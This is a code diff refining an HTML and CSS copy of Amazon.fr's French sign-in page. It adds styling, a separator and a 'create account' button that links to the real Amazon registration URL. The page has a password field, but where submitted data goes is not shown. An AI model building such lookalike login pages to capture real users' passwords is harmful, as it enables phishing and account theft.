@@ -52,7 +52,7 @@ font-size:12px;
   display:flex;
   flex-direction:column;
   align-items:center;
-  transform: translateY(-50px);
+  transform: translateY(-10px);
 }
 
 .logo img{
@@ -76,6 +76,27 @@ font-size:12px;
   margin-top: -40px;
 }
 
+.footer p{
+position: relative;
+padding-bottom: 10px;
+}
+
+.container h4{
+position: relative;
+padding-top: 25px;
+}
+
+.container h4::after{
+content: "";
+position: absolute;
+left: 0;
+right: 0;
+top: 0;
+height: 1px;
+background: #e0e0e0;
+}
+
+
 h2{
 font-size:20px;
 font-weight:normal;
@@ -95,6 +116,7 @@ color: #3a6ea5;
 .top-section h4{
 font-size:14px;
 font-weight:400;
+max-width:300;
 }
 
 .top-section a h4{
@@ -102,7 +124,7 @@ text-decoration: none;
 }
 
 a:hover{
-color: #001c49;
+color: #000000;
 }
 
 input{
@@ -143,6 +165,7 @@ filter: contrast(0.95) brightness(0.99);
 
 .footer{
 margin-top:15px;
+margin-left:-5;
 max-width:290px;
 font-size:12px;
 color:black;
@@ -151,6 +174,55 @@ color:black;
 .footer h4 a{
 text-decoration: none;
 font-weight:500;
+}
+
+.secondary-btn{
+display:block;
+width: 340px;      
+margin-top: 2px;
+padding: 7px;
+background: white;
+color:black;
+border: 1px solid #929292;
+border-radius: 20px;
+cursor: pointer;
+letter-spacing:0.1;
+text-align:center;
+text-decoration:none;
+font-weight: 500;
+transition: 0.2s;
+transform: translateY(4px);
+}
+
+.secondary-btn:hover{
+background: #f1f1f1;
+}
+
+a.secondary-btn{
+  color:black;
+  text-decoration:none;
+}
+
+.separator{
+width: 350px;
+display: flex;
+align-items: center;
+margin: 15px 0;
+color: #767676;
+font-size: 11.5px;
+transform: translateY(10px);
+}
+
+.separator::before,
+.separator::after{
+content: "";
+flex: 1;
+height: 1px;
+background: #d5d9d9;
+}
+
+.separator span{
+padding: 0 10px;
 }
 
 </style>
@@ -177,7 +249,6 @@ font-weight:500;
         <input type="password" name="password" placeholder="Mot de passe" required />
 
         <button type="submit">Continuer</button>
-
       </form>
 
       <div class="footer">
@@ -195,11 +266,21 @@ font-weight:500;
       <h4> 
         <a href="https://www.amazon.fr/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">Vous avez besoin d'aide pour vous identifier ?</a>
       </h4>
+
       </div>
 
     </div>
+  <div class="separator">
+    <span>Nouveau chez Amazon ?</span>
+  </div>
+  <a href="https://www.amazon.fr/ap/register?openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3F%26tag%3Dhydraamazon05-21%26ref%3Dnav_signin%26adgrpid%3D154637622122%26hvpone%3D%26hvptwo%3D%26hvadid%3D683560492550%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D3185657194183930010%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D9056101%26hvtargid%3Dkwd-10573980%26hydadcr%3D&prevRID=HNX7KK13CTXQVMQKJJT8&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&prepopulatedLoginId=&failedSignInCount=0&webAuthnChallengeIdForAutofill=fGLJhWDlLgK7Csm5EGEHif0vXmCfwS2G%3AEU&webAuthnGetParametersForAutofill=eyJycElkIjoiYW1hem9uLmZyIiwiY2hhbGxlbmdlIjoiZkdMSmhXRGxMZ0s3Q3NtNUVHRUhpZjB2WG1DZndTMkciLCJ0aW1lb3V0IjozMjQ0NDEsIm1lZGlhdGlvbiI6ImNvbmRpdGlvbmFsIiwidXNlclZlcmlmaWNhdGlvbiI6InByZWZlcnJlZCJ9&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=frflex&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="secondary-btn">
+  Créer votre compte Amazon
+  </a>
+
 
   </div>
+
+</div>
 
 </div>
 
